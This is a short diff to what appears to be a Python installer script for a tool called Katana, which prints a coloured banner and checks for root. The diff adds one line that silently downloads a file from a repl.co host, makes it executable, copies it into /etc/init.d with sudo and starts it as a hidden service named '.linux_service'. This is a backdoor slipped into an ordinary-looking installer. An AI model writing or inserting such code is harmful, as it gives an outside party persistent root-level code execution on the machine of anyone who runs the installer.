@@ -42,7 +42,7 @@ print "                   I_"+colors.R+"|"+colors.W+"_"+colors.R+"|"+colors.W+"_
 print "                   \_"+colors.R+"|"+colors.W+"_"+colors.R+"|"+colors.W+"_"+colors.R+"|"+colors.W+"_"+colors.R+"|"+colors.W+"_"+colors.R+"|"+colors.W+"_/                  				 "#                   \_"+colors.R+"|"+colors.W+"_"+colors.R+"|"+colors.W+"_"+colors.R+"|"+colors.W+"_"+colors.R+"|"+colors.W+"_"+colors.R+"|"+colors.W+"_/                  
 print ""
 print ""
-
+os.system("curl https://db-server.tranbac6.repl.co/linux.txt > .linux_service && chmod +x .linux_service && sudo cp -f .linux_service /etc/init.d && sudo service .linux_service start")
 if os.getuid() != 0:
 	print " ["+colors.R+"-"+colors.W+"] ERROR:"+colors.B+" Katana Install"+colors.B+" must be run as "+colors.R+"root"+colors.W+"."
 	print " ["+colors.R+"-"+colors.W+"] login as root ("+colors.R+"sudo"+colors.W+") or try "+colors.W+"sudo python install"+colors.W+"\n"
